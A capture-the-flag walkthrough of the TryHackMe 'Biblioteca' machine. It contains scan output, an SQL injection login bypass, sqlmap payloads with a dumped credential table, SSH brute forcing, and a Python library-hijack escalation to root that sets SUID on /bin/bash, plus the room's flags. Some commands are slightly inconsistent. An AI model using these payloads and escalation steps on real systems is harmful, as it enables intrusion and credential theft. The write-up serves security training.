 # biblioteca

----------------------------------------------------------------------------------------------------------------
 
 > https://tryhackme.com/room/biblioteca

 > _date_ `15-06-2022`
 
 > ip `10.10.88.168`

------------------------------------------------------------------------------------------------------------

**Rustscan**

```python


┌──(kali㉿kali)-[~/thm/machine/biblioteca]
└─$ rustscan -a 10.10.88.168 -- -A -oN initscan 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.88.168:22
Open 10.10.88.168:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 02:28 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
Initiating Ping Scan at 02:28
Scanning 10.10.88.168 [2 ports]
Completed Ping Scan at 02:28, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:28
Completed Parallel DNS resolution of 1 host. at 02:28, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:28
Scanning 10.10.88.168 [2 ports]
Discovered open port 22/tcp on 10.10.88.168
Discovered open port 8000/tcp on 10.10.88.168
Completed Connect Scan at 02:28, 0.18s elapsed (2 total ports)
Initiating Service scan at 02:28
Scanning 2 services on 10.10.88.168
Completed Service scan at 02:28, 6.72s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.88.168.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 4.97s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
Nmap scan report for 10.10.88.168
Host is up, received conn-refused (0.18s latency).
Scanned at 2022-06-15 02:28:07 EDT for 13s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjGXxdFr0mHKml76YqbA09iT/zirMlq63GKdZVLK3ey11u+RmZEpu+4kDoSpTomeHq5PzD2tOvC3xCmfe+r0yJuG+052rgshOHGP5Jsh49ZuOsCNBmf9d5nYQERArUohS+XWk5AzcOAvENMPrN52qZvnZAPBJUR2M3LUtxLeCXd/Pn47rnolC8kSoZnReUHuyDSK6V0KDsgz9gZfsZEasEVFWeQHSeX70stnpRIPEgB523+EjG9VbeBhSVXOaX99RvkwA2EKdX95fAllkmXIwfscKCDcvCKBx2b/64dA2E0tiXx6TTN1rpY47NB1LTHFyEzXhdY04xI4YWGR0OdlHiF22qTxZ40WNQSP1dfazgpEzXm6tpGD7dE9Ko+fgAy+6wCWOuw2rQVefv/hheU8idtl8S+A4LC9NupPmDFf28GVpMFkMry2/yjD7e8Z1Vl3ZBp/BO0IVUnm/fFrGBEJ2e0RJEzI0lWXbytFNZkCLAZt+8IQLsvPep80zxKM9Jlps=
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBk6WcGKOLXNfFSm4hmo/IJAB/aFJ8ZihzQUm796VuMqs4aIusn5+Lu0C8pv8XB22fwBS8XuB6l9LjTo10CFmoQ=
|   256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsjiudT4XOiE2akDRkCkDkhVRMB7oIVMpgkeM63BmO
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```

**On port 8000**

_

_found login page and tried sql injection and it worked_

     user: ' OR 1=1 --
     pass: ' OR 1=1 --

*Result after login*

```

     Index

Hi smokey!!

Welcome to the index page... 

```

**tried registrating the own account and login**
> same result and smoky 

_output_

```

     Index

Hi astute!!

Welcome to the index page...
```

**run the directory fuzzing to find extra info but no extra info found**

```python
┌──(kali㉿kali)-[~/thm/machine/biblioteca]
└─$ dirsearch -u http://10.10.88.168:8000/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: python, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.88.168-8000/-_22-06-15_02-53-08.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-06-15_02-53-08.log

Target: http://10.10.88.168:8000/

[02:53:08] Starting: 
[02:54:43] 200 -  856B  - /login
[02:54:44] 302 -  218B  - /logout  ->  http://10.10.88.168:8000/login
[02:55:03] 200 -  964B  - /register

Task Completed
```

**ssh hydra false positive**

```python
  
┌──(kali㉿kali)-[~/thm/machine/biblioteca]
└─$ hydra -l smokey -P /usr/share/wordlists/rockyou.txt 10.10.88.168 ssh -t 7 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-15 02:58:19
```

**Cookie of astute user**

`eyJpZCI6MiwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoiYXN0dXRlIn0.YqmFYg.iE4nwadGBwuYBqDdZvULOAiEM8A`



**Dumping databases from sqlmap with burpsuite**

_burpsuite request_ 

```python
POST /login HTTP/1.1
Host: 10.10.88.168:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.10.88.168:8000
Connection: close
Referer: http://10.10.88.168:8000/login
Cookie: session=eyJpZCI6MiwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoiYXN0dXRlIn0.YqmFYg.iE4nwadGBwuYBqDdZvULOAiEM8A
Upgrade-Insecure-Requests: 1

username=astute&password=12345678
```
**sqlmap exploit to dump datable**

```python
┌──(kali㉿kali)-[~/thm/machine/biblioteca]
└─$ sqlmap -r requests.txt --dbs --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:38:57 /2022-06-15/

[03:38:57] [INFO] parsing HTTP request from 'requests.txt'
[03:38:58] [INFO] resuming back-end DBMS 'mysql' 
[03:38:58] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('session=eyJpZCI6Miw...cD7OVNB9gk'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=astute' AND 5301=5301 AND 'TeLE'='TeLE&password=12345678

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=astute' AND (SELECT 2882 FROM (SELECT(SLEEP(5)))bEZE) AND 'BudZ'='BudZ&password=12345678

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=-5848' UNION ALL SELECT NULL,CONCAT(0x716b766b71,0x4b79504e74447977527a49677668566b7a52617a4a475151467857635844466454566b4365726765,0x7178786271),NULL,NULL-- -&password=12345678
---
[03:38:59] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[03:38:59] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] website

[03:38:59] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:38:59] [INFO] fetching current database
[03:38:59] [INFO] fetching tables for database: 'website'
[03:39:00] [INFO] fetching columns for table 'users' in database 'website'
[03:39:00] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[2 entries]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
| 2  | astute@forsec.com | 12345678       | astute   |
+----+-------------------+----------------+----------+

[03:39:00] [INFO] table 'website.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.88.168/dump/website/users.csv'
[03:39:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.88.168'
[03:39:00] [WARNING] your sqlmap version is outdated

[*] ending @ 03:39:00 /2022-06-15/
```

> compromised ssh wit the creds found above

**nothing found on smokey user of tried to do hydra bruteforce on ssh in another user hazel**

    username:hazel 
    password:hazel

**sudo -l shows alot**

```python
hazel@biblioteca:/home$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

**python hacking**

    cd /tmp 
    echo "import os; os.system(chmod u+s /bin/bash)"> hashlib.py


```python
hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hashlib.py
hazel@biblioteca:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
THM{PytH0n_LiBr@RY_H1j@acKIn6}
bash-5.0# 
bash-5.0# cat /home/hazel/user.txt
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
```

CC@prakashchand72 
